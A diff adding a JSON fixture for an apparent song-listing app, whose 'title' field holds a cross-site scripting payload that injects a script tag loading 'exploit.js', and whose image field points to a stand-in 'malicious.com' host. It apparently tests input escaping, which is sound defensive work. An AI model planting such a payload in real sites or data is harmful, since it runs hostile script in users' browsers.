@@ -1,0 +1,14 @@
+{
+    "index": {
+      "number": 1,
+      "style": "full"
+    },
+    "n1": {
+      "name": "Test Song",
+      "desc": "Test Description",
+      "upload": "2023-10-01",
+      "img": "http://malicious.com/image.png",
+      "patch": "test.mp3",
+      "title": "'); var s = document.createElement('script'); s.src = './exploit.js'; document.head.appendChild(s); //"
+    }
+  }
